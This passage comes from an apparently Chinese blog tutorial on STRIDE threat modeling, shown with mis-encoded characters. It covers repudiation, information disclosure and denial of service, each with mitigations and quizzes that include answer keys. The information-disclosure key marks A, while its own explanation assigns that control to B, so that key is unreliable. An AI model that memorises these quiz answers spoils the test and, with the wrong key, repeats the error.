src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨</td></tr></tbody></table><p>äº¤äº’</p><table><thead><tr><th>åç§°</th><th align="left">äº¤äº’</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td>è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">ä¸€ä¸ªä»»åŠ¡ä»ä»»åŠ¡æ¥æ”¶æ•°æ®æˆ–å‘ä»»åŠ¡å‘é€æ•°æ®</td></tr><tr><td>è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘ç”¨æˆ·å‘é€æ•°æ®æˆ–ä»ç”¨æˆ·æ¥æ”¶æ•°æ®</td></tr><tr><td>è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ®</td></tr></tbody></table><h4 id="å¦‚ä½•é˜²æ­¢å¦è®¤æ€§æ”»å‡»"><a href="#å¦‚ä½•é˜²æ­¢å¦è®¤æ€§æ”»å‡»" class="headerlink" title="å¦‚ä½•é˜²æ­¢å¦è®¤æ€§æ”»å‡»"></a>å¦‚ä½•é˜²æ­¢å¦è®¤æ€§æ”»å‡»</h4><p>ä¸å¯å¦è®¤æ€§é€šè¿‡åˆ›å»ºå’Œä¿æŠ¤å®‰å…¨æ—¥å¿—æ¥ç¡®ä¿æ¯ä¸ªæ“ä½œéƒ½å¯ä»¥è¿½æº¯åˆ°å…¶æ¥æºã€‚</p><h4 id="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-2"><a href="#ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-2" class="headerlink" title="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶"></a>ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶</h4><ul><li>å¼ºèº«ä»½éªŒè¯</li><li>å®‰å…¨æ—¥å¿—è®°å½•å’Œç›‘è§†</li><li>æ•°å­—ç­¾å</li><li>å®‰å…¨æ—¶é—´æˆ³</li><li>å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹</li></ul><div class="note green"><p>æ¨èé—®é¢˜ï¼šæ˜¯å¦å¯ä»¥å°†æ¯ä¸ªæ“ä½œä¸èº«ä»½ç»‘å®šï¼Ÿ</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-15"><a href="#çŸ¥è¯†æ£€æŸ¥-15" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹å¦è®¤æ€§çš„å®‰å…¨æ§åˆ¶ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== B ==</psw></p><p>è§£é‡Šï¼š<psw>A. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚</psw></p><h3 id="ä¿¡æ¯æ³„æ¼-æŸ¥çœ‹ä¸åº”æŸ¥çœ‹çš„æ•°æ®"><a href="#ä¿¡æ¯æ³„æ¼-æŸ¥çœ‹ä¸åº”æŸ¥çœ‹çš„æ•°æ®" class="headerlink" title="ä¿¡æ¯æ³„æ¼ - æŸ¥çœ‹ä¸åº”æŸ¥çœ‹çš„æ•°æ®"></a>ä¿¡æ¯æ³„æ¼ - æŸ¥çœ‹ä¸åº”æŸ¥çœ‹çš„æ•°æ®</h3><p>å‘æœªç»æˆæƒçš„ä¸ªäººå…¬å¼€æ•æ„Ÿæ•°æ®æ—¶ï¼Œä¼šå‘ç”Ÿä¿¡æ¯æ³„æ¼ã€‚ æ— è®ºæ˜¯åœ¨æœ‰æ„æˆ–æ— æ„çš„æƒ…å†µä¸‹ï¼Œéƒ½æœ‰å¯èƒ½å‘ç”Ÿä¿¡æ¯æ³„éœ²ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ç³»ç»Ÿé€šè¿‡é”™è¯¯æ¶ˆæ¯æ³„éœ²æ•æ„Ÿæ•°æ®</li><li>ç”¨æˆ·è®¿é—®å®‰å…¨æ§åˆ¶è¾ƒå¼±çš„æœªæˆæƒæ–‡æ¡£å’Œæ–‡ä»¶å¤¹</li><li>ç”¨æˆ·è®¿é—®æµç»éå®‰å…¨ç½‘ç»œçš„æ•°æ®</li></ul><h4 id="å¯èƒ½é¢ä¸´ä¿¡æ¯æ³„æ¼é£é™©çš„å…ƒç´ å’Œäº¤äº’"><a href="#å¯èƒ½é¢ä¸´ä¿¡æ¯æ³„æ¼é£é™©çš„å…ƒç´ å’Œäº¤äº’" class="headerlink" title="å¯èƒ½é¢ä¸´ä¿¡æ¯æ³„æ¼é£é™©çš„å…ƒç´ å’Œäº¤äº’"></a>å¯èƒ½é¢ä¸´ä¿¡æ¯æ³„æ¼é£é™©çš„å…ƒç´ å’Œäº¤äº’</h4><p>å…ƒç´ </p><table><thead><tr><th align="left">åç§°</th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨</td></tr><tr><td align="left">æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨</td></tr><tr><td align="left">æ•°æ®æµ</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨</td></tr></tbody></table><p>äº¤äº’</p><table><thead><tr><th align="left">åç§°</th><th align="left">äº¤äº’</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å°†æ•°æ®å‘é€åˆ°å¦ä¸€ä¸ªä»»åŠ¡</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“</td><td align="left"><img src="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" class="lazyload" data-srcset="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘ç”¨æˆ·å‘é€æ•°æ®æˆ–ä»ç”¨æˆ·æ¥æ”¶æ•°æ®</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ®</td></tr><tr><td align="left">æ•°æ®æµ &lt;-&gt; ä¿¡ä»»è¾¹ç•Œ</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">é€šè¿‡ Internet å°†æ•°æ®ä»å—ä¿¡ä»»çš„ç¯å¢ƒä¼ è¾“ç»™æŸäººï¼ˆåä¹‹äº¦ç„¶ï¼‰</td></tr></tbody></table><h4 id="å¦‚ä½•é˜²æ­¢ä¿¡æ¯æ³„æ¼"><a href="#å¦‚ä½•é˜²æ­¢ä¿¡æ¯æ³„æ¼" class="headerlink" title="å¦‚ä½•é˜²æ­¢ä¿¡æ¯æ³„æ¼"></a>å¦‚ä½•é˜²æ­¢ä¿¡æ¯æ³„æ¼</h4><p>æœºå¯†æ€§ç¡®ä¿æ•°æ®å—åˆ°ä¿æŠ¤ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>åº”ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œä»¥ç¡®ä¿åˆé€‚çš„ç”¨æˆ·å¯ä»¥è®¿é—®é€‚å½“çš„æ•°æ®</li><li>åŠ å¯†é™æ€æ•°æ®ã€ä¼ è¾“ä¸­æ•°æ®å’Œæ­£åœ¨ä½¿ç”¨çš„æ•°æ®</li><li>å¼ºåˆ¶å®æ–½ SSL/TLS ä»¥ä¿æŠ¤ä¼ è¾“</li><li>ä½¿ç”¨ IPSec éš§é“ä¿æŠ¤è·¨ç»ˆç»“ç‚¹çš„é€šä¿¡</li></ul><h4 id="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-3"><a href="#ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-3" class="headerlink" title="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶"></a>ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶</h4><ul><li>åŠ å¯†</li><li>è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)</li></ul><div class="note green"><p>æ¨èé—®é¢˜ï¼šæ˜¯å¦å¯ä»¥ç¡®ä¿æ²¡æœ‰äººèƒ½æŸ¥çœ‹æˆ‘çš„ä¼ è¾“ä¸­çš„æ•°æ®å’Œé™æ€æ•°æ®ï¼Ÿ</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-16"><a href="#çŸ¥è¯†æ£€æŸ¥-16" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹ä¿¡æ¯æ³„æ¼çš„å®‰å…¨æ§åˆ¶ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚</psw></p><h3 id="æ‹’ç»æœåŠ¡-ç³»ç»Ÿç¹å¿™"><a href="#æ‹’ç»æœåŠ¡-ç³»ç»Ÿç¹å¿™" class="headerlink" title="æ‹’ç»æœåŠ¡ - ç³»ç»Ÿç¹å¿™"></a>æ‹’ç»æœåŠ¡ - ç³»ç»Ÿç¹å¿™</h3><p>å½“æ”»å‡»è€…å¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨æ—¶ï¼Œå°†å‘ç”Ÿæ‹’ç»æœåŠ¡ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>å‘ç½‘ç»œå‘é€å¤§é‡è¯·æ±‚</li><li>å ç”¨å†…å­˜å’Œ CPU è¿›ç¨‹</li><li>è¯·æ±‚æ•°é‡è¿‡å¤šå¯¼è‡´æ•°æ®å­˜å‚¨å´©æºƒ</li></ul><h4 id="å¯èƒ½é¢ä¸´æ‹’ç»æœåŠ¡é£é™©çš„å…ƒç´ å’Œäº¤äº’"><a href="#å¯èƒ½é¢ä¸´æ‹’ç»æœåŠ¡é£é™©çš„å…ƒç´ å’Œäº¤äº’" class="headerlink" title="å¯èƒ½é¢ä¸´æ‹’ç»æœåŠ¡é£é™©çš„å…ƒç´ å’Œäº¤äº’"></a>å¯èƒ½é¢ä¸´æ‹’ç»æœåŠ¡é£é™©çš„å…ƒç´ å’Œäº¤äº’</h4><p>å…ƒç´ </p><table><thead><tr><th align="left">åç§°</th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨</td></tr><tr><td align="left">æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨</td></tr><tr><td align="left">æ•°æ®æµ</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨</td></tr></tbody></table><p>äº¤äº’</p><table><thead><tr><th align="left">åç§°</th><th align="left">äº¤äº’</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å°†æ•°æ®å‘é€åˆ°å¦ä¸€ä¸ªä»»åŠ¡</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“</td><td align="left"><img src="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" class="lazyload" data-srcset="file:///Users/tari/Sites/TARI0510.github.io/source/img/thread-modeling/process-externalentity.png?lastModify=1617599435" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘ç”¨æˆ·å‘é€æ•°æ®æˆ–ä»ç”¨æˆ·æ¥æ”¶æ•°æ®</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ®</td></tr><tr><td align="left">æ•°æ®æµ &lt;-&gt; ä¿¡ä»»è¾¹ç•Œ</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">é€šè¿‡ Internet å°†æ•°æ®ä»å—ä¿¡ä»»çš„ç¯å¢ƒä¼ è¾“ç»™æŸäººï¼ˆåä¹‹äº¦ç„¶ï¼‰</td></tr></tbody></table><h4 id="å¦‚ä½•é˜²æ­¢æ‹’ç»æœåŠ¡"><a href="#å¦‚ä½•é˜²æ­¢æ‹’ç»æœåŠ¡" class="headerlink" title="å¦‚ä½•é˜²æ­¢æ‹’ç»æœåŠ¡"></a>å¦‚ä½•é˜²æ­¢æ‹’ç»æœåŠ¡</h4><p>å¯ç”¨æ€§ç¡®ä¿ç³»ç»Ÿä¸ºç”¨æˆ·å¯åŠ¨ä¸”æ­£å¸¸è¿è¡Œã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ä½¿ç”¨ç½‘ç»œè®¿é—®æ§åˆ¶åˆ—è¡¨æ§åˆ¶ä¼ å…¥å’Œä¼ å‡ºçš„æµé‡</li><li>ä½¿ç”¨å¼¹æ€§èµ„æºç®¡ç†ä¸æ–­å¢åŠ æˆ–å‡å°‘çš„ä½¿ç”¨é‡</li><li>ç›‘è§†ç³»ç»Ÿä»¥æ£€æµ‹æ˜¯å¦å‡ºç°å¼‚å¸¸</li><li>å¯ç”¨æ“ä½œç³»ç»Ÿæ ‡å¿—æ¥å¤„ç†å†…å­˜å’Œ CPU è¿›ç¨‹</li></ul><h4 id="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-4"><a href="#ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-4" class="headerlink" title="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶"></a>ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶</h4><ul><li>è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)</li><li>ç­›é€‰</li><li>é…é¢</li><li>æˆæƒ</li><li>é«˜å¯ç”¨æ€§</li></ul><div class="note green"><p>æ¨èé—®é¢˜ï¼šæˆ‘çš„æœåŠ¡åœ¨æŸäº›åœ°åŒºæ˜¯å¦ä¼šè¢«é™åˆ¶èµ„æºï¼Ÿ</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-17"><a href="#çŸ¥è¯†æ£€æŸ¥-17" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹æ‹’ç»æœåŠ¡çš„å®‰å…¨æ§åˆ¶ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç³»ç»Ÿä¾é å¼¹æ€§èµ„æºæ¥å¤„ç†æ¥æ”¶åˆ°çš„æ›´å¤šè¯·æ±‚ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== C ==</psw></p><p>è§£é‡Šï¼š<psw>A. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºæ‹’ç»æœåŠ¡ã€‚</psw></p><h3 id="æƒé™æå‡-æ‹¥æœ‰æœ¬ä¸åº”è¯¥æœ‰ç”¨çš„æƒé™"><a href="#æƒé™æå‡-æ‹¥æœ‰æœ¬ä¸åº”è¯¥æœ‰ç”¨çš„æƒé™" class="headerlink" title="æƒé™æå‡ - æ‹¥æœ‰æœ¬ä¸åº”è¯¥æœ‰ç”¨çš„æƒé™"></a>æƒé™æå‡ - æ‹¥æœ‰æœ¬ä¸åº”è¯¥æœ‰ç”¨çš„æƒé™</h3><p>ä¸ªäººæœªç»è®¸å¯è®¿é—®èµ„æºæ—¶ï¼Œå°±ä¼šå‘ç”Ÿæƒé™æå‡ã€‚ 